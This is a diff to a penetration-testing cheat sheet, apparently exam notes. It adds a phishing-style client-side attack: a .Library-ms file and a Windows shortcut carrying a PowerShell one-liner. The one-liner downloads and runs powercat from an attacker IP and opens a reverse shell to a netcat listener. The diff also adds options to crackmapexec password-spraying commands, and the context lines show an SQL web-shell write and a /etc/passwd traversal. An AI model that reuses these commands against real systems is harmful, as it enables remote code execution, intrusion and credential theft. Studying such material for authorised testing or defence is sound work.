@@ -266,6 +266,45 @@ SELECT "" into outfile "C:\\xampp\\htdocs\\shell.php"
 http://x.x.x.x/blah?parameter=/etc/passwd%00
 ```
 
+# Client Side Attack
+## Microsoft Office documents containing Macros 
+
+```bash
+# set up Webdav share
+mkdir /home/kali/beyond/webdav
+/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
+
+#on windows machine create new text file "config.Library-ms", paste the below code, edit the ip "http://192.168.119.5". and transfer to kali
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.119.5</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+
+#still on the windows machine, 1. right click create shortcut, 2. paste the below. 3.  install as shortcut file name, 4.  transfer the resulting shortcut file to Kali 
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
+
+#on kali
+cp /usr/share/powershellempire/empire/server/data/module_source/management/powercat.ps1 .
+python3 -m http.server 8000
+# then start netcat listener after running python3 web server
+nc -nvlp 4444
+```
+
 # Window Priv Esc
 ## Enumeration
 ### User
@@ -582,10 +621,11 @@ impacket-secretdump exam.com/apachesvc@192.168.1xx.101
 - Spray with known password on list of found usernames
 ```bash
 # Crackmapexec uses SMB - check if the output shows 'Pwned!'
+# --continue-on-success to avoid stopping at the first valid credentials.
 crackmapexec <protocol> <target(s)> -u username1 -p password1 password2
 crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
-crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords
-crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes
+crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords  --continue-on-success 
+crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --continue-on-success
         e.g. crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #use continue-on-success option if it's subnet
         e.g. crackmapexec smb 192.168.1xx.100 -u users.txt -p 'ESMWaterP1p3S!'
         e.g. crackmapexec 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1
